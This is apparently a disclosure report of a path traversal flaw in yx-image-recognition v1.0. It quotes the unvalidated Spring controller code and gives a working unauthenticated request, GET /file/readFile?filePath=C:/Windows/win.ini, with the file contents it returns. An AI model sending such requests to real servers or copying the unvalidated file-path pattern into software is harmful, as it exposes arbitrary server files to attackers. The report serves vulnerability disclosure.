

# yx-image-recognition v1.0 Path Traversal Vulnerability Report

## Introduction to Vulnerabilities

Multiple interfaces in yx-image-recognition (an image recognition system based on Spring Boot 2.1.5) are vulnerable to path traversal attacks. Parameters such as `dir`, `filePath` are directly passed to `new File()` for file system operations without any path sanitization or whitelist validation.

The `FileController.getFileTreeByDir()` / `FileController.readFile()` / `PlateController.recognise()` / `FaceController.recognise()` / `CardController.recognise()` methods of Spring MVC accept user-controlled path parameters, and the direct `new File(userInput)` pattern leads to arbitrary file system access.

The system lacks any path traversal filtering (no `../` check, no canonical path validation, no whitelist of allowed directories). After sending a single HTTP GET request, the attacker can list any directory and read any file on the server.

---

## Affected Versions

yx-image-recognition v1.0 (latest version)

## Exploit Conditions

- No authentication required (all interfaces are fully public)
- No special permissions needed
- Can be exploited remotely via HTTP GET

---

## Vulnerability Reproduction

### FileController.getFileTreeByDir — Directory Listing

Read system files:

```
GET /file/readFile?filePath=C:/Windows/win.ini
```

Response:

```
; for 16-bit app support
[fonts]
[extensions]
[Mail]
MAPI=1
```

![image-20260807105616041](https://github.com/fangtang7/picx-images-hosting/raw/master/Zyplayer-Doc/image-20260807105616041.99u2jqteu4.webp)



## Source Code Analysis

### FileController.java — Resource Point (Lines 46-54, 69-79)

```java
// FileController.java:46 — getFileTreeByDir: dir parameter comes directly from HTTP GET
@RequestMapping(value = "/getFileTreeByDir", method = RequestMethod.GET)
public Object getFileTreeByDir(String dir, String typeFilter, String detectType) {
    try {
        if(null != dir) {
            dir = URLDecoder.decode(dir, "utf-8");  // ← Only URL decoding, NO path validation
        }
    } catch (UnsupportedEncodingException e) {
        throw new ResultReturnException("dir参数异常");
    }
    return fileService.getFileTreeByDir(dir, detectType, typeFilter);  // ← Passes directly to service
}

// FileController.java:69 — readFile: filePath parameter comes directly from HTTP GET
@GetMapping(value = "/readFile", produces= {"image/jpeg"})
public ResponseEntity<InputStreamResource> readFile(String filePath, HttpServletResponse response) throws IOException {
    filePath = URLDecoder.decode(filePath, "utf-8");  // ← Only URL decoding, NO path validation
    File file = fileService.readFile(filePath);        // ← Passes directly to service
    ...
}
```

![image-20260807105737561](https://github.com/fangtang7/picx-images-hosting/raw/master/Zyplayer-Doc/image-20260807105737561.1ow5fjn70q.webp)
